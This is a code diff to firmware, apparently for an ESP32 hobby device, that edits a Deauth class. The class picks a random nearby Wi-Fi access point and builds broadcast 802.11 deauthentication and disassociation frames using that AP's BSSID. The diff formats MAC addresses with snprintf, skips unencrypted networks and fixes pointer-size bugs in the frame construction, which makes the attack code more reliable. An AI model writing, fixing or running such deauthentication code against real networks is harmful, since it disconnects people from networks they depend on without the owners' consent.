@@ -128,28 +128,16 @@ bool Deauth::broadcast(uint8_t *mac) {
 }
 
 void Deauth::printMac(uint8_t *mac) {
-  for (int i = 0; i < 6; i++) {
-    Serial.print(mac[i], HEX);
-    if (i < 5) {
-      Serial.print(":");
-    }
-  }
-
-  Serial.println();
+  String macStr = printMacStr(mac);
+  Serial.println(macStr);
+  Display::updateDisplay("('-')", "AP BSSID: " + macStr);
 }
 
 String Deauth::printMacStr(uint8_t *mac) {
-  String macStr = "";
-  for (int i = 0; i < 6; i++) {
-    if (mac[i] < 16) {
-      macStr += "0";
-    }
-    macStr += String(mac[i], HEX);
-    if (i < 5) {
-      macStr += ":";
-    }
-  }
-  return macStr;
+  char buf[18]; // 17 for MAC, 1 for null terminator
+  snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1],
+           mac[2], mac[3], mac[4], mac[5]);
+  return String(buf);
 }
 
 bool Deauth::select() {
@@ -200,7 +188,7 @@ bool Deauth::select() {
     Display::updateDisplay("('-')", "Selected random AP: " + randomAP);
     delay(Config::shortDelay);
 
-    if (encType == -1) {
+    if (encType == WIFI_AUTH_OPEN || encType == -1) {
       Serial.println(
           "('-') Selected AP is not encrypted. Skipping deauthentication...");
       Display::updateDisplay(
@@ -259,10 +247,6 @@ bool Deauth::select() {
     // bssid
     uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);
 
-    // set our mac address
-    uint8_t mac[6];
-    WiFi.macAddress(mac);
-
     /** developer note:
      *
      * addr1: reciever addr
@@ -275,50 +259,16 @@ bool Deauth::select() {
     std::copy(Deauth::broadcastAddr,
               Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
               Deauth::deauthFrame + 4);
-    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 10);
-    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 16);
+    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
+    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);
 
     std::copy(Deauth::broadcastAddr,
               Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
               Deauth::disassociateFrame + 4);
-    std::copy(apBssid, apBssid + sizeof(apBssid),
+    std::copy(apBssid, apBssid + 6,
               Deauth::disassociateFrame + 10);
-    std::copy(apBssid, apBssid + sizeof(apBssid),
+    std::copy(apBssid, apBssid + 6,
               Deauth::disassociateFrame + 16);
-
-    if (!broadcast(Deauth::broadcastAddr)) {
-      // build deauth
-      Deauth::deauthFrame[0] = 0xC0; // type
-      Deauth::deauthFrame[1] = 0x00; // subtype
-      Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
-      Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
-
-      // reason
-      Deauth::deauthFrame[24] = 0x01; // reason: unspecified
-
-      std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::deauthFrame + 10);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::deauthFrame + 16);
-
-      // build disassocaition
-      Deauth::disassociateFrame[0] = 0xA0; // type
-      Deauth::disassociateFrame[1] = 0x00; // subtype
-      Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
-      Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)
-
-      std::copy(apBssid, apBssid + sizeof(apBssid),
-                Deauth::disassociateFrame + 4);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::disassociateFrame + 10);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::disassociateFrame + 16);
-    }
 
     Serial.print("('-') Full AP SSID: ");
     Serial.println(WiFi.SSID(Deauth::randomIndex));
@@ -338,8 +288,6 @@ bool Deauth::select() {
 
     Serial.print("('-') AP BSSID: ");
     printMac(apBssid);
-    Display::updateDisplay("('-')",
-                           "AP BSSID: " + Deauth::printMacStr(apBssid));
 
     Serial.print("('-') AP Channel: ");
     Serial.println(WiFi.channel(Deauth::randomIndex));
